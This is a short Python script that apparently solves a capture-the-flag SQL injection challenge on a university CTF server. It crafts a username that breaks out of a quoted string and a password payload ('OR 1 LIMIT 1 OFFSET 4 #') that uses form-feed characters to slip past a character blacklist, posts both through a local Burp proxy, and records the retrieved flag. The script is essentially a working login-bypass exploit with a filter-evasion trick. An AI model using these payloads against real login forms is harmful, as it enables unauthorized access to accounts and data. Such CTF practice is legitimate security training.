import requests

# "SELECT username FROM tbl_user WHERE username = ('aaaaaaaaaaaaaa\' AND password = ') OR 1 LIMIT 1 #'"
username_payload = "a" * 14 + '"'
print(len(username_payload))
print(username_payload)

whitespace = chr(12) # form feed \f (no idea why the other whitespaces broke)
print(' ' == whitespace)
print(whitespace)
password_payload = f"{whitespace}OR{whitespace}1{whitespace}LIMIT{whitespace}1{whitespace}OFFSET{whitespace}4{whitespace}#"
# print(len(payload))
print(password_payload)
blacklist = """
/[ \t\%\_\|\&\/\*\!\=\$\^\?]/
"""
for char in blacklist:
    if char in password_payload:
        print("WE FUCKED UP!")
proxies = {
    "http": 'http://127.0.0.1:8080', # burp suite proxy
}

IP = 'http://ctf99.cs.ui.ac.id:9006/'
data = {
    'username': username_payload,
    'password': password_payload
}
print(data)

response = requests.post(IP, proxies=proxies, data=data)
print(response.text) # CSCE604258{simpl3_SQL_1nj3ctioN_w1th_tW1sT_HuH}